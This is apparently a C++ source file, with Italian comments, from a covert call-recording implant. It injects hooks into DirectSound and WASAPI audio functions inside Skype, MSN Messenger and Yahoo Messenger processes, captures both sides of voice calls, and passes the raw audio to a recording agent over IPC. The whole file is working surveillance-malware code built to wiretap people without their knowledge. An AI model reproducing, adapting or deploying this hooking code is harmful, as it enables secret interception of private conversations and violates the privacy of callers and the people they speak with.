#include <shlwapi.h>
#include <mmdeviceapi.h>
#include <audioclient.h>

#include "speex/speex.h"
#include "dsound.h"

#define SAMPLE_RATE_DEFAULT	48000
#define SAMPLE_RATE_SKYPE	48000
#define SAMPLE_RATE_SKYPE_W	44100
#define SAMPLE_RATE_GTALK	48000
#define SAMPLE_RATE_YMSG	48000
#define SAMPLE_RATE_YMSG_IN	96000
#define SAMPLE_RATE_MSN		16000

typedef MMRESULT (WINAPI *waveOutGetID_t) (HWAVEOUT , LPUINT);
typedef MMRESULT (WINAPI *waveInGetID_t) (HWAVEOUT , LPUINT);
typedef HRESULT (WINAPI *DirectSoundCreate_t) (LPCGUID , LPDIRECTSOUND *, DWORD);
typedef HRESULT (WINAPI *DirectSoundCaptureCreate_t) (LPCGUID , LPDIRECTSOUNDCAPTURE *, DWORD);

// Funzioni risolte nella DLL del CODEC
typedef void *(*speex_encoder_init_t)(SpeexMode *);
typedef int (*speex_encoder_ctl_t)(void *, int, void *);
typedef void (*speex_encoder_destroy_t)(void *);
typedef int (*speex_encode_t)(void *, float *, SpeexBits *);
typedef void (*speex_bits_init_t)(SpeexBits *);
typedef void (*speex_bits_reset_t)(SpeexBits *);
typedef int (*speex_bits_write_t)(SpeexBits *, char *, int);
typedef void (*speex_bits_destroy_t)(SpeexBits *);
typedef SpeexMode *(*speex_lib_get_mode_t)(int);

speex_encoder_init_t rel_speex_encoder_init;
speex_encoder_ctl_t rel_speex_encoder_ctl;
speex_encoder_destroy_t rel_speex_encoder_destroy;
speex_encode_t rel_speex_encode;
speex_bits_init_t rel_speex_bits_init;
speex_bits_reset_t rel_speex_bits_reset;
speex_bits_write_t rel_speex_bits_write;
speex_bits_destroy_t rel_speex_bits_destroy;
speex_lib_get_mode_t rel_speex_lib_get_mode;

typedef struct partner_struct {
	DWORD Id;
	DWORD participants;
	char *peer;
#define VOIP_SKYPE 1
#define VOIP_GTALK 2
#define VOIP_YAHOO 3
#define VOIP_MSMSG 4
#define VOIP_MOBIL 5
#define VOIP_SKWSA 6
#define VOIP_MSNWS 7
	DWORD voip_program;
#define CALL_SKYPE_OLD 1	// Abbiamo ricevuto un chunl audio NON dalle wasapi, quindi ignoriamo quelli provenienti da li'
	DWORD flags;		
	struct partner_struct *next;
} partner_entry;


typedef struct _VoiceAdditionalData {
	UINT uVersion;
		#define LOG_VOICE_VERSION 2008121901
	UINT uChannel;
	UINT uProgramType;
	UINT uSampleRate;
	UINT uIngoing;
	FILETIME start;
	FILETIME stop;
	UINT uCallerIdLen;
	UINT uCalleeIdLen;
} VoiceAdditionalData, *pVoiceAdditionalData;

#define FLAGS_INPUT 1   // Ricevuto dal microfono
#define FLAGS_OUTPUT 2  // Suonato dalla scheda audio

#define FLAGS_SKAPI_INI 4    // Messaggio delle api di Skype (inizializzazione)
#define FLAGS_SKAPI_MSG 8    // Messaggio delle api di Skype
#define FLAGS_SKAPI_WND 16   // Messaggio delle api di Skype (thread di dispatch)
#define FLAGS_SKAPI_SWD 32   // Messaggio delle api di Skype
#define FLAGS_SKAPI_ATT 64   // Messaggio di Skype: Segnala il core che deve fare l'attach per inviare messaggi

#define FLAGS_YMSG_IN  128	// Messaggio delle api di YahooMessenger
#define FLAGS_YMSG_OUT 256	// Messaggio delle api di YahooMessenger

#define FLAGS_GTALK_IN  512  // Messaggio delle api di Gtalk
#define FLAGS_GTALK_OUT 1024 // Messaggio delle api di Gtalk

#define FLAGS_MSN_IN  2048 // Messaggio delle api di Msn Live
#define FLAGS_MSN_OUT 4096 // Messaggio delle api di Msn Live

#define FLAGS_SAMPLING 8192 // Messaggio per indicare il sample rate

// Gli ultimi due bit di flag (2^30 e 2^31) sono riservati al chunk
// audio e contengoono il numero di canali utilizzato
// In questo caso i bit da 24 a 29 sono usati per identificare il tipo di 
// programma utilizzato <voip_program>

#define MAX_HASHKEY_LEN MAX_PATH*3 // Lunghezza massima chiavi di hash per skype config

#define DEFAULT_SAMPLE_SIZE (512*1024) // 512KB
#define DEFAULT_COMPRESSION 3
#define MAX_ID_LEN 250
#define CALL_DELTA 16 // Intervallo in decimi di secondo che differenzia due chiamate

#define INPUT_ELEM 0
#define OUTPUT_ELEM 1

CRITICAL_SECTION skype_critic_sec;
partner_entry *call_list_head = NULL;
BOOL bPM_VoipRecordStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
DWORD sample_size[2] = {0,0};        // Viene inizializzato solo all'inizio
DWORD sample_channels[2] = {1,1};	 // Numero di canali
DWORD sample_sampling[2] = {SAMPLE_RATE_SKYPE_W, SAMPLE_RATE_SKYPE_W}; // Sample rate dei due canali per skype con wasapi
FILETIME channel_time_start[2];		 // Time stamp di inizio chiamata
FILETIME channel_time_last[2];       // Time stamp dell'ultimo campione
BYTE *wave_array[2] = {NULL, NULL};	 // Buffer contenenti i PCM dei due canali
DWORD max_sample_size = 500000; // Dimensione oltre la quale salva un sample su file
DWORD compress_factor = 5; // Fattore di compressione del codec
HMODULE codec_handle = NULL; // Handle alla dll del codec
BOOL bPM_spmcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hSkypePMThread = NULL;
BOOL IsSkypePMInstalled();

// Sono condivise anche da IM e Contacts
HWND skype_api_wnd = NULL;
HWND skype_pm_wnd = NULL;

#include <mmsystem.h>
// XXX Dovrei liberare i buffer e le strutture create
BYTE *GetDirectSoundGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
{
	LPDIRECTSOUNDBUFFER lpDSBuffer;
	LPDIRECTSOUND lpDS = NULL;
	PCMWAVEFORMAT pcmwf;
	DSBUFFERDESC dsbdesc;
	BYTE ***interface_ptr;
	BYTE **func_ptr;
	HMODULE hdsound;
	DirectSoundCreate_t pDirectSoundCreate;

	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
		return NULL;
	if ( !(pDirectSoundCreate = (DirectSoundCreate_t)HM_SafeGetProcAddress(hdsound, "DirectSoundCreate") ) )
		return NULL;

	if (DS_OK != pDirectSoundCreate(NULL, &lpDS, NULL))
		return NULL;

	memset( &pcmwf, 0, sizeof(PCMWAVEFORMAT) );
	pcmwf.wf.wFormatTag         = WAVE_FORMAT_PCM;      
	pcmwf.wf.nChannels          = 1;
	pcmwf.wf.nSamplesPerSec     = 48000;
	pcmwf.wf.nBlockAlign        = (WORD)2;
	pcmwf.wf.nAvgBytesPerSec    = 96000;
	pcmwf.wBitsPerSample        = (WORD)16;

	memset(&dsbdesc, 0, sizeof(DSBUFFERDESC));
	dsbdesc.dwSize              = sizeof(DSBUFFERDESC);
	dsbdesc.dwFlags             = DSBCAPS_CTRLFREQUENCY|DSBCAPS_CTRLPAN|DSBCAPS_CTRLVOLUME ;
	dsbdesc.dwBufferBytes       = 512; 
	dsbdesc.lpwfxFormat         = (LPWAVEFORMATEX)&pcmwf;
		
	if (DS_OK != lpDS->CreateSoundBuffer(&dsbdesc, &lpDSBuffer, NULL))
		return NULL;

	interface_ptr = (BYTE ***)lpDSBuffer;
	func_ptr = *interface_ptr;

	*DSLock   = *(func_ptr + 11);
	*DSUnlock = *(func_ptr + 19);
	*DSGetFormat = *(func_ptr + 5);

	if ((*DSLock) == NULL || (*DSUnlock) == NULL || (*DSGetFormat) == NULL) 
		return NULL;

	func_ptr += 4;
	return *func_ptr;
}

// XXX Dovrei liberare i buffer e le strutture create
BYTE *GetDirectSoundCaptureGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
{
	LPDIRECTSOUNDCAPTURE lpDSC;
	LPDIRECTSOUNDCAPTUREBUFFER lpDSCB;
	DSCBUFFERDESC cdbufd;
	PCMWAVEFORMAT pcmwf;
	BYTE ***interface_ptr;
	BYTE **func_ptr;
	HMODULE hdsound;
	DirectSoundCaptureCreate_t pDirectSoundCaptureCreate;

	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
		return NULL;
	if ( !(pDirectSoundCaptureCreate = (DirectSoundCaptureCreate_t)HM_SafeGetProcAddress(hdsound, "DirectSoundCaptureCreate") ) )
		return NULL;

	if ( DS_OK != pDirectSoundCaptureCreate(NULL, &lpDSC, NULL))
		return NULL;

	memset( &pcmwf, 0, sizeof(PCMWAVEFORMAT) );
	pcmwf.wf.wFormatTag         = WAVE_FORMAT_PCM;      
	pcmwf.wf.nChannels          = 1;
	pcmwf.wf.nSamplesPerSec     = 48000;
	pcmwf.wf.nBlockAlign        = (WORD)2;
	pcmwf.wf.nAvgBytesPerSec    = 96000;
	pcmwf.wBitsPerSample        = (WORD)16;

	memset(&cdbufd, 0, sizeof(cdbufd));
	cdbufd.dwSize = sizeof(DSCBUFFERDESC);
	cdbufd.dwBufferBytes = 100;
	cdbufd.lpwfxFormat = (LPWAVEFORMATEX)&pcmwf;
	
	if (DS_OK != lpDSC->CreateCaptureBuffer(&cdbufd, &lpDSCB, NULL))
		return NULL;

	interface_ptr = (BYTE ***)lpDSCB;
	func_ptr = *interface_ptr;

	*DSLock   = *(func_ptr + 8);
	*DSUnlock = *(func_ptr + 11);
	*DSGetFormat = *(func_ptr + 5);

	if ((*DSLock) == NULL || (*DSUnlock) == NULL || (*DSGetFormat) == NULL) 
		return NULL;

	func_ptr += 4;
	return *func_ptr;
}

typedef DWORD (WINAPI *DSLock_t)(DWORD, DWORD, DWORD, LPVOID *, LPDWORD, LPVOID *, LPDWORD, DWORD);
typedef DWORD (WINAPI *DSUnlock_t)(DWORD, LPVOID, DWORD, LPVOID, DWORD);
typedef DWORD (WINAPI *DSGetFormat_t)(DWORD, LPVOID, DWORD, LPDWORD);


///////////////////////////
//
//   Dsound::DSGetCP
//
///////////////////////////
typedef struct {
	COMMONDATA;
	DWORD prog_type;
	DWORD old_play_c;
	DWORD saved_cp;
	BYTE *buffer_address;
	DWORD buffer_tot_len;
	DSLock_t pDSLock;
	DSUnlock_t pDSUnlock;
	DSGetFormat_t pDSGetFormat;
} DSGetCPStruct;

DSGetCPStruct DSGetCPData;
#define THRESHOLD 0x3C0


#define LARGE_CLI_WRITE(x, y, z, k) { BYTE *wave_ptr = x; \
		                           DWORD to_write = y; \
		                           while (to_write > 0) { \
			                          if (to_write <= MAX_MSG_LEN) { \
				                         pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, wave_ptr, to_write, z, k); \
		 		                         to_write = 0; \
			                          } else { \
				                         pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, wave_ptr, MAX_MSG_LEN, z, k); \
				                         wave_ptr += MAX_MSG_LEN; \
									     to_write -= MAX_MSG_LEN; }}}

DWORD __stdcall PM_DSGetCP(DWORD class_ptr,
                           DWORD *write_c,
					  	   DWORD *play_c)
{
	BOOL *Active;
	DWORD *dummy1;
	DWORD dummy2;
	BYTE *temp_buf;
	DWORD temp_len;
	DWORD new_counter;
	WAVEFORMATEX wfx_format;
	
	MARK_HOOK

	INIT_WRAPPER(DSGetCPStruct)
	CALL_ORIGINAL_API(3);

	// Se qualcosa e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=DS_OK)
		return ret_code;

	// Copia il valore in locale per evitare race
	if (play_c == NULL)
		return ret_code;

	new_counter = *play_c;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	// Locka l'intero buffer
	// lo fa ogni volta per trovare gli indirizzi anche quando
	// cambia il buffer lasciando invariato il class_ptr
	if (pData->pDSLock(class_ptr, 0, 0, (LPVOID *)&temp_buf, &temp_len, (LPVOID *)&(dummy1), &(dummy2), DSBLOCK_ENTIREBUFFER) != DS_OK) 
		return ret_code;

	pData->pDSUnlock(class_ptr, temp_buf, temp_len, dummy1, dummy2);
	wfx_format.nChannels = 2;
	pData->pDSGetFormat(class_ptr, &wfx_format, sizeof(WAVEFORMATEX), NULL);


	// Se e' la prima volta che lo chiama (o ha cambiato buffer)
	// salva i valori e ritorna
	if (pData->old_play_c == -1 || pData->saved_cp != class_ptr ||
		pData->buffer_address != temp_buf || pData->buffer_tot_len != temp_len) {
		if ( (new_counter%2)==0 ) {
			pData->old_play_c = new_counter;
			pData->saved_cp = class_ptr;
			pData->buffer_address = temp_buf;
			pData->buffer_tot_len = temp_len;
		}

		return ret_code;
	}

	// Nessun cambiamento
	if (new_counter == pData->old_play_c)
		return ret_code;

	// Non ha wrappato
	if (new_counter > pData->old_play_c) {
		dummy2 = (new_counter - pData->old_play_c);
		if (  dummy2>=THRESHOLD && dummy2<=THRESHOLD*60 && (dummy2%2)==0 ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (new_counter - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = new_counter;
		}
	} else {
		// Ha wrappato
		dummy2 = new_counter + (pData->buffer_tot_len - pData->old_play_c);
		if (  dummy2>=THRESHOLD && dummy2<=THRESHOLD*60 && (dummy2%2)==0 ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (pData->buffer_tot_len - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
			LARGE_CLI_WRITE((pData->buffer_address), new_counter, (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = new_counter;
		}
	}

	return ret_code;
}


DWORD PM_DSGetCP_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "skype.exe") && 
			stricmp(proc_name, "msnmsgr.exe") &&
			stricmp(proc_name, "yahoomessenger.exe"))
			return 1; // Hooka solo skype.exe e MSN
		if (!stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
			return 1; // Solo su XP prendiamo le dsound
	} else
		return 1;

	if (!stricmp(proc_name, "skype.exe"))
		DSGetCPData.prog_type = VOIP_SKYPE;
	else if (!stricmp(proc_name, "msnmsgr.exe"))
		DSGetCPData.prog_type = VOIP_MSMSG;
	else if (!stricmp(proc_name, "yahoomessenger.exe"))
		DSGetCPData.prog_type = VOIP_YAHOO;
	else
		DSGetCPData.prog_type = 0;

	DSGetCPData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	DSGetCPData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	DSGetCPData.old_play_c = -1;

	if ( ! (DSGetCPData.bAPIAdd = GetDirectSoundGetCP( (BYTE **)&(DSGetCPData.pDSLock), (BYTE **)&(DSGetCPData.pDSUnlock), (BYTE **)&(DSGetCPData.pDSGetFormat) ) ))
		return 1;

	DSGetCPData.dwHookLen = 980;
	return 0;
}

///////////////////////////
//
//   Dsound::DSCapGetCP
//
///////////////////////////

typedef struct {
	COMMONDATA;
	DWORD prog_type;
	DWORD old_play_c;
	DWORD saved_cp;
	BYTE *buffer_address;
	DWORD buffer_tot_len;
	DSLock_t pDSLock;
	DSUnlock_t pDSUnlock;
	DSGetFormat_t pDSGetFormat;
} DSCapGetCPStruct;

DSCapGetCPStruct DSCapGetCPData;

DWORD __stdcall PM_DSCapGetCP(DWORD class_ptr,
                              DWORD *write_c,
					  	      DWORD *play_c)
{
	BOOL *Active;
	DWORD *dummy1;
	DWORD dummy2;
	BYTE *temp_buf;
	DWORD temp_len;
	WAVEFORMATEX wfx_format;

	MARK_HOOK
	
	INIT_WRAPPER(DSCapGetCPStruct)
	CALL_ORIGINAL_API(3);

	if(play_c == NULL)
		return ret_code;

	// Se e' andato storto, ritorna
	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=DS_OK)
		return ret_code;

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	// Locka l'intero buffer
	// lo fa ogni volta per trovare gli indirizzi anche quando
	// cambia il buffer lasciando invariato il class_ptr
	if (pData->pDSLock(class_ptr, 0, 0, (LPVOID *)&temp_buf, &temp_len, (LPVOID *)&(dummy1), &(dummy2), DSCBLOCK_ENTIREBUFFER) != DS_OK) 
		return ret_code;

	pData->pDSUnlock(class_ptr, temp_buf, temp_len, dummy1, dummy2);
	wfx_format.nChannels = 2;
	pData->pDSGetFormat(class_ptr, &wfx_format, sizeof(WAVEFORMATEX), NULL);

	// Se e' la prima volta che lo chiama (o ha cambiato buffer)
	// salva i valori e ritorna
	if (pData->old_play_c == -1 || pData->saved_cp != class_ptr ||
		pData->buffer_address != temp_buf || pData->buffer_tot_len != temp_len) {
		
		// Check paranoico
		if(play_c)	
			pData->old_play_c = *play_c;
		else
			return ret_code;

		pData->saved_cp = class_ptr;
		pData->buffer_address = temp_buf;
		pData->buffer_tot_len = temp_len;
		return ret_code;
	}

	// Nessuno cambiamento
	if (*play_c == pData->old_play_c)
		return ret_code;

	// Non ha wrappato
	if (*play_c > pData->old_play_c) {
		if ( (*play_c - pData->old_play_c) >= THRESHOLD ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (*play_c - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = *play_c;
		}
	} else {
		// Ha wrappato
		if (*play_c + (pData->buffer_tot_len - pData->old_play_c) >= THRESHOLD ) {
			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (pData->buffer_tot_len - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			LARGE_CLI_WRITE((pData->buffer_address), (*play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
			pData->old_play_c = *play_c;
		}
	}

	return ret_code;
}


DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;
	HMODULE hMod;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "skype.exe") &&
			stricmp(proc_name, "msnmsgr.exe") &&
			stricmp(proc_name, "yahoomessenger.exe"))
			return 1; // Hooka solo skype.exe e MSN
		if (!stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
			return 1; // Solo su XP prendiamo le dsound
	} else
		return 1;

	DSCapGetCPData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	DSCapGetCPData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	DSCapGetCPData.old_play_c = -1;

	if (!stricmp(proc_name, "skype.exe"))
		DSCapGetCPData.prog_type = VOIP_SKYPE;
	else if (!stricmp(proc_name, "msnmsgr.exe"))
		DSCapGetCPData.prog_type = VOIP_MSMSG;
	else if (!stricmp(proc_name, "yahoomessenger.exe"))
		DSGetCPData.prog_type = VOIP_YAHOO;
	else 
		DSCapGetCPData.prog_type = 0;

	if ( ! (DSCapGetCPData.bAPIAdd = GetDirectSoundCaptureGetCP( (BYTE **)&(DSCapGetCPData.pDSLock), (BYTE **)&(DSCapGetCPData.pDSUnlock), (BYTE **)&(DSCapGetCPData.pDSGetFormat) ) ))
		return 1;

	DSCapGetCPData.dwHookLen = 980;
	return 0;
}


///////////////////////////
//
//   WASAPI
//
///////////////////////////
#define SKYPE_WASAPI_BITS 2
#define MSN_WASAPI_BITS 4
#define WASAPI_GETBUFFER 3
#define WASAPI_RELEASEBUFFER 4
BYTE *GetWASAPIRenderFunctionAddress(IMMDevice *pMMDevice, DWORD func_num, DWORD *n_channels, DWORD *sampling)
{
	BYTE **func_ptr;
	BYTE ***interface_ptr;
	HRESULT hr;
    WAVEFORMATEX *pwfx;
	IAudioClient *pAudioClient = NULL;
	IAudioRenderClient *pAudioRenderClient = NULL;
	
    hr = pMMDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
    if (FAILED(hr)) 
		return NULL;

	hr = pAudioClient->GetMixFormat(&pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	if (n_channels)
		*n_channels = (DWORD)(pwfx->nChannels);
	if (sampling)
		*sampling = (DWORD)(pwfx->nSamplesPerSec);
	
	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 0, 0, pwfx, NULL);
    CoTaskMemFree(pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	hr = pAudioClient->GetService(__uuidof(IAudioRenderClient), (void**)&pAudioRenderClient);
    if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	interface_ptr = (BYTE ***)pAudioRenderClient;
	if (!interface_ptr || !(func_ptr = *interface_ptr)) {
		pAudioRenderClient->Release();
		pAudioClient->Release();
		return NULL;
	}
	func_ptr += func_num; 
	
	pAudioRenderClient->Release();
	pAudioClient->Release();
	return *func_ptr;
}

HRESULT GetWASAPIRenderFunction(BYTE **ret_ptr, DWORD func_num, DWORD *n_channels, DWORD *sampling) 
{
	BYTE *func_ptr;
	IMMDeviceEnumerator *pMMDeviceEnumerator;
	IMMDevice			*pMMDevice;
    HRESULT hr = S_OK;

	CoInitialize(NULL);

    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pMMDeviceEnumerator);
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eCommunications, &pMMDevice);
	pMMDeviceEnumerator->Release();
	if (FAILED(hr)) {
		CoUninitialize();
        return hr;
	}

	func_ptr = GetWASAPIRenderFunctionAddress(pMMDevice, func_num, n_channels, sampling);
	pMMDevice->Release();
	CoUninitialize();

	if (func_ptr) {
		*ret_ptr = func_ptr;
		return S_OK;
	}

	return S_FALSE;
}

typedef struct {
	COMMONDATA;
	BYTE *obj_ptr;
	BYTE *obj_ptr2;
	BYTE *audio_data;
	BYTE *audio_data2;
	BOOL active;
	BOOL active2;
} WASAPIGetBufferStruct;

WASAPIGetBufferStruct WASAPIGetBufferData;

HRESULT __stdcall PM_WASAPIGetBuffer(BYTE *class_ptr, 
									 DWORD NumFramesRequested,
									 BYTE **ppData)
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(WASAPIGetBufferStruct)
	CALL_ORIGINAL_API(3);

	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (ret_code!=S_OK || !Active || !(*Active))
		return ret_code;

	// E' una nuova chiamata
	if (pData->obj_ptr && pData->obj_ptr2 && pData->obj_ptr!=class_ptr && pData->obj_ptr2!=class_ptr) {
		pData->obj_ptr = NULL;
		pData->obj_ptr2 = NULL;
		pData->active = FALSE;
		pData->active2 = FALSE;
	}

	// Memorizza 2 oggetti
	if (pData->obj_ptr == NULL) {
		pData->obj_ptr = class_ptr;
		pData->audio_data = *ppData;
	} else if (pData->obj_ptr != class_ptr) {
		if (pData->obj_ptr2 == NULL) {
			pData->obj_ptr2 = class_ptr;
			pData->audio_data2 = *ppData;
		}
	}

	if (pData->obj_ptr == class_ptr)
		pData->audio_data = *ppData;

	if (pData->obj_ptr2 == class_ptr)
		pData->audio_data2 = *ppData;	
	
	return ret_code;
}

DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIGetBufferData.obj_ptr = NULL;
	WASAPIGetBufferData.obj_ptr2 = NULL;
	WASAPIGetBufferData.audio_data = NULL;
	WASAPIGetBufferData.audio_data2 = NULL;
	WASAPIGetBufferData.active = FALSE;
	WASAPIGetBufferData.active2 = FALSE;

	if (GetWASAPIRenderFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
		return 1;

	WASAPIGetBufferData.dwHookLen = 350;
	return 0;
}

typedef struct {
	COMMONDATA;
	DWORD prog_type;
	WASAPIGetBufferStruct *c_data;
	DWORD n_channels;
	DWORD sampling;
	DWORD sampling2;
} WASAPIReleaseBufferStruct;
WASAPIReleaseBufferStruct WASAPIReleaseBufferData;

HRESULT __stdcall PM_WASAPIReleaseBuffer(BYTE *class_ptr, 
									 DWORD NumFramesWrittem,
									 DWORD Flags)
{
	BOOL *Active;
	DWORD i;

	MARK_HOOK
	INIT_WRAPPER(WASAPIReleaseBufferStruct)
	
	// Controlla se il monitor e' attivo
	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (Active && (*Active) && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
		if (pData->sampling != 0) {
			pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
			pData->sampling = 0;
		}

		if (pData->c_data->obj_ptr==class_ptr) {
			// Vede se e' un oggetto in cui sta scrivendo qualcosa
			if (!pData->c_data->active)
				for (i=0; i<256; i++) { 
					if (pData->c_data->audio_data[i] != 0) {
						pData->c_data->active = TRUE;
						break;
					}
				}
			if (pData->c_data->active) 
				LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
		}

		if (pData->c_data->obj_ptr2==class_ptr) {
			// Vede se e' un oggetto in cui sta scrivendo qualcosa
			if (!pData->c_data->active2)
				for (i=0; i<256; i++) { 
					if (pData->c_data->audio_data2[i] != 0) {
						pData->c_data->active2 = TRUE;
						break;
					}
				}
			if (pData->c_data->active2) 
				LARGE_CLI_WRITE(pData->c_data->audio_data2, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
		}

	}

	CALL_ORIGINAL_API(3);
	return ret_code;
}

DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta del processo voip
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++; 
		if (stricmp(proc_name, "skype.exe"))
			return 1; // Hooka solo skype.exe
	} else
		return 1;
	
	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
	WASAPIReleaseBufferData.prog_type = VOIP_SKWSA;

	if (GetWASAPIRenderFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), &(WASAPIReleaseBufferData.sampling)) != S_OK)
		return 1;

	WASAPIReleaseBufferData.dwHookLen = 800;
	return 0;
}

BYTE *GetWASAPICaptureFunctionAddress(IMMDevice *pMMDevice, DWORD func_num, DWORD *n_channels, DWORD *sampling)
{
	BYTE **func_ptr;
	BYTE ***interface_ptr;
	HRESULT hr;
    WAVEFORMATEX *pwfx;
	IAudioClient *pAudioClient = NULL;
	IAudioCaptureClient *pAudioCaptureClient = NULL;
	
    hr = pMMDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
    if (FAILED(hr)) 
		return NULL;

	hr = pAudioClient->GetMixFormat(&pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}
	if (n_channels)
		*n_channels = (DWORD)(pwfx->nChannels);
	if (sampling)
		*sampling = (DWORD)(pwfx->nSamplesPerSec);
	
	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 0, 0, pwfx, NULL);
    CoTaskMemFree(pwfx);
	if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pAudioCaptureClient);
    if (FAILED(hr)) {
		pAudioClient->Release();
		return NULL;
	}

	interface_ptr = (BYTE ***)pAudioCaptureClient;
	if (!interface_ptr || !(func_ptr = *interface_ptr)) {
		pAudioCaptureClient->Release();
		pAudioClient->Release();
		return NULL;
	}
	func_ptr += func_num; 
	
	pAudioCaptureClient->Release();
	pAudioClient->Release();
	return *func_ptr;
}

